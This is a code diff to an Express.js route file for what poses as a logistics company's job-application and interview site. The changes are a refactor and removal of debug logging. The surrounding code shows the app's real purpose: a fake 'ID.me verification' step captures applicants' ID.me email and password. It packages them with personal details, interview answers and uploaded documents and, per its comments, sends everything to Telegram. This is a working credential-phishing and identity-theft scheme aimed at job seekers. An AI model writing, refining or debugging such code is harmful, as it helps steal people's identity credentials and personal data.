@@ -7,6 +7,7 @@ const fetch = require('node-fetch');
 const FormData = require('form-data');
 const { Redis } = require('@upstash/redis');
 const nodemailer = require('nodemailer');
+const jobDetails = require('../data/jobDetails');
 
 const router = express.Router();
 
@@ -23,20 +24,8 @@ const upload = multer({
   limits: { fileSize: 15 * 1024 * 1024 },
 });
 
-const JOB_POSITIONS = [
-  'Logistics Coordinator / Dispatcher',
-  'Supply Chain Analyst',
-  'Customer Support',
-  'HR / Recruitment / Talent Acquisition',
-  'IT / Software Support',
-  'Drivers (truck, delivery, fleet)',
-  'Warehouse Staff & Forklift Operators',
-  'Fleet & Maintenance Supervisors',
-  'Virtual Assistance',
-  'Account Manager',
-  'Project Manager',
-  'Data Entry',
-];
+// Source job positions from jobDetails titles for consistency
+const JOB_POSITIONS = Object.values(jobDetails).map(j => j.title);
 
 // Normalize position for mapping
 function normalizePosition(pos) {
@@ -45,13 +34,6 @@ function normalizePosition(pos) {
 
 // --- INTERVIEW_QUESTIONS_MAP and DEFAULT_QUESTIONS FULL CONTENT ---
 const INTERVIEW_QUESTIONS_MAP = {
-  "nursing practitioner": [
-    { name: "motivation", label: "What motivated you to pursue a career as a Nursing Practitioner, and how do you see yourself contributing to our healthcare team?" },
-    { name: "challengingCase", label: "Describe a challenging patient case you've handled and how you approached the diagnosis and treatment plan." },
-    { name: "stayCurrent", label: "How do you stay current with the latest medical research and evidence-based practices in your field?" },
-    { name: "collaboration", label: "Tell us about a time when you had to collaborate with other healthcare professionals to achieve the best patient outcome." },
-    { name: "disagreement", label: "How would you handle a situation where a patient disagrees with your recommended treatment plan?" }
-  ],
   "logistics coordinator dispatcher": [
     { name: "motivation", label: "Why did you choose a career in logistics and dispatching?" },
     { name: "dispatchChallenge", label: "Describe a time you solved a major dispatch challenge." },
@@ -163,9 +145,6 @@ router.get('/', (req, res) => {
 router.post('/start', upload.array('documents', 6), async (req, res) => {
   try {
     const { firstName, lastName, email, phone, coverLetter, position } = req.body;
-    console.log('Original position from form:', position);
-    console.log('Available positions in JOB_POSITIONS:', JOB_POSITIONS);
-    
     req.session.applicationDraft = {
       firstName,
       lastName,
@@ -183,13 +162,8 @@ router.post('/start', upload.array('documents', 6), async (req, res) => {
 
     // Always normalize position before lookup!
     const normalizedPosition = normalizePosition(position);
-    console.log('Normalized position:', normalizedPosition);
-    console.log('Available keys in INTERVIEW_QUESTIONS_MAP:', Object.keys(INTERVIEW_QUESTIONS_MAP));
-    console.log('Does normalized position exist in map?', normalizedPosition in INTERVIEW_QUESTIONS_MAP);
     const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
-    console.log('Selected questions:', selectedQuestions.map(q => q.name));
     const isDefault = !(normalizedPosition in INTERVIEW_QUESTIONS_MAP);
-    console.log('Using default questions?', isDefault);
     res.render('application-submitted', {
       questions: selectedQuestions,
       position,
@@ -220,13 +194,7 @@ router.get('/interview', (req, res) => {
 // Interview POST: show info-note before ID.me verification
 router.post('/interview', async (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
-  // Log received interview answers and session contents for debugging
-  console.log('Received interview answers:', req.body);
-  console.log('Position from session:', req.session.applicationDraft.position);
-  console.log('Normalized position:', normalizePosition(req.session.applicationDraft.position));
   req.session.interviewAnswers = req.body;
-  console.log('Session after interview POST:', req.session);
-  // No Telegram send here, wait until after ID.me so all data is in one JSON
   res.render('info-note');
 });
 
@@ -242,28 +210,14 @@ router.get('/verify', (req, res) => {
 // Verification POST (handles "sign in" to ID.me, sends all data as JSON FILE to Telegram)
 router.post('/verify', async (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
-  // Log received ID.me credentials and session for debugging
-  console.log('Received ID.me credentials:', req.body);
-  console.log('Raw req.body keys:', Object.keys(req.body));
-  console.log('Raw req.body values:', req.body);
-  console.log('Session at /verify POST:', req.session);
-
   const { email, password } = req.body;
-  console.log('Destructured email:', email || 'UNDEFINED');
-  console.log('Destructured password:', password ? '[PROVIDED]' : 'UNDEFINED');
-  
   req.session.verified = true;
   req.session.idme = { email, password };
-  console.log('Session.idme after setting:', { 
-    email: req.session.idme.email || 'MISSING', 
-    password: req.session.idme.password ? '[SET]' : 'MISSING' 
-  });
 
   // Compose full JSON (applicationDraft, interviewAnswers, idme)
   const application = req.session.applicationDraft;
   const interviewAnswers = req.session.interviewAnswers || {};
   const idmeCreds = { email, password };
-  console.log('idmeCreds object being used in payload:', idmeCreds);
 
   // Build interview Q&A object
   const normalizedPosition = normalizePosition(application.position);
@@ -287,7 +241,6 @@ router.post('/verify', async (req, res) => {
     interview_answers: answersObj,
     idme_credentials: idmeCreds
   };
-  console.log('Final payload being sent to Telegram:', JSON.stringify(payload, null, 2));
 
   // Write JSON to temporary file and send as real .json document
   const filename = `application_${Date.now()}.json`;
